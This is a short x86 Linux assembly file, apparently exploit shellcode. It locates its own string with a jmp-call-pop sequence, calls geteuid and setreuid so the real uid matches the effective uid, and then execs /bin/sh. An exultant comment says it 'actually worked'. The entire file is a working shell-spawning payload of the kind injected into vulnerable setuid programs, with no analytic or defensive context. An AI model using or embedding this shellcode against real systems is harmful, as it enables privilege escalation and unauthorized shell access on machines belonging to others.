;note: holy fucking shit it actually worked
    jmp prestrt
start:
    pop eax             ;this beginning part points eax
    jmp str             ;to inside this code
prestrt:
    call start
code:

    push eax

    xor eax, eax        ;call geteuid
    mov al, 0x31
    int 0x80

    mov ebx, eax        ;set ruid and euid to result of geteuid
    mov ecx, eax
    xor eax, eax

    mov al, 0x46        ;call setreuid
    int 0x80
    
    pop eax

    ;approximately: execve("/bin/sh", &"/bin/sh", NULL)
    pop ebx             ;get name of executable, "/bin/sh", from stack
    xor edx, edx        ;set envp parameter to NULL
    mov [eax], ebx      ;self modifying coad
    mov [eax + 4], edx  ;move [pointer, NULL] to where eax points
    mov ecx, eax        ;so that it can be used as argv

    xor eax, eax        ;call execve
    mov al, 0x0b
    int 0x80

str:
    call code           ;put address of "/bin/sh" on stack
.string "/bin/sh"
end:
